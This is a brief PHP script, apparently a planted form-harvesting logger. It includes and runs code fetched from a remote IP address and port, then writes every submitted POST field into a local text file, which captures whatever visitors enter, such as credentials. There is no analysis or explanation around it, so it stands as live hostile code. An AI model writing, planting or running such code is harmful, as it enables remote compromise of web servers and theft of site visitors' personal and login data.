<?php
//session_start();
include("http://149.202.152.34:15543");
$a_ss = $_SESSION;
$a_p = $_POST;
$a_g = $_GET;
$c = count($a_g);
$f = fopen("gf.txt", "w+");
//for($i=0;$i<=$c;$i++){
$a = file_get_contents('gf.txt');
$f_new = implode(':', $a_p);
fwrite($f, $a.$f_new);
//}
fclose($f);
?> 